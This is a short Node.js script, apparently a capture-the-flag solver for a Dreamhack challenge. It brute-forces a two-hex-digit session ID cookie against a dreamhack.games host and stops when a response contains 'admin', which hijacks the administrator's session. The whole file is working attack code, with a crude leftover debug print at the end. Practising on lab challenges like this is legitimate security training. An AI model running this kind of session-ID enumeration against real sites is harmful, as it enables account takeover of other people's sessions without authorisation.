const axios = require('axios');

const url = 'http://host3.dreamhack.games:18757/';
const a = '0123456789abcdef';

(async () => {
    try {
        for (let i of a) {
            for (let j of a) {
                const headers = { 'Cookie': `sessionid=${i}${j}` };
                const response = await axios.get(url, { headers });

                if (response.data.includes('admin')) {
                    console.log(response.data);
                    console.log(i, j);
                    return;  // admin sessionid 찾으면 종료
                }
            }
        }
    } catch (error) {
        console.error('An error occurred:', error);
    }
    console.log('ass');
})();
